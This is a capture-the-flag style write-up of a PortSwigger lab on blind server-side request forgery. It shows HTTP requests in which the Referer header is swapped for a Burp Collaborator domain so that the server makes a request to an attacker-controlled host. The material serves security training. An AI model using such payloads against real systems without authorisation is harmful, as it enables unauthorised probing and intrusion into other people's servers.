# PortSwigger Lab: Blind SSRF with Out-of-Band Detection

## Objective

Exploit a Blind SSRF vulnerability in the analytics functionality and use Burp Collaborator to detect out-of-band interactions initiated by the application.

---

## Vulnerability

The application uses analytics software that fetches the URL contained in the `Referer` header whenever a product page is visited. Since the response from the back-end request is not returned to the user, the vulnerability is classified as **Blind SSRF**.

---

## Steps

### 1. Intercept a Product Request

Browse to any product page and intercept the request using Burp Suite.

Send the request to Burp Repeater.

Example request:

```http
GET /product?productId=1 HTTP/2
Host: <LAB-ID>.web-security-academy.net
Referer: https://example.com
```

---

### 2. Insert a Burp Collaborator Payload

In Repeater, select the value of the `Referer` header.

Right-click and choose:

```text
Insert Collaborator Payload
```

Burp generates a unique Collaborator domain:

```text
http://<random>.burpcollaborator.net
```

Modified request:

```http
GET /product?productId=1 HTTP/2
Host: <LAB-ID>.web-security-academy.net
Referer: http://<random>.burpcollaborator.net
```

Send the request.

---

### 3. Check for Out-of-Band Interactions

Open the **Collaborator** tab and click:

```text
Poll now
```

After a few seconds, Burp Collaborator displays incoming interactions generated by the application.

Observed interactions:

* DNS lookup
* HTTP request

These interactions confirm that the application made a server-side request to the supplied URL.

---

## Payload Used

```text
Referer: http://<random>.burpcollaborator.net
```

---

## Explanation

When a product page is loaded, the analytics component retrieves the URL specified in the `Referer` header. By replacing the original value with a Burp Collaborator domain, the server is forced to initiate a request to an external system under the attacker's control.

Since the response from the server-side request is not reflected in the application's response, the vulnerability is considered **Blind SSRF**. The interaction is detected using Out-of-Band Application Security Testing (OAST) techniques provided by Burp Collaborator.
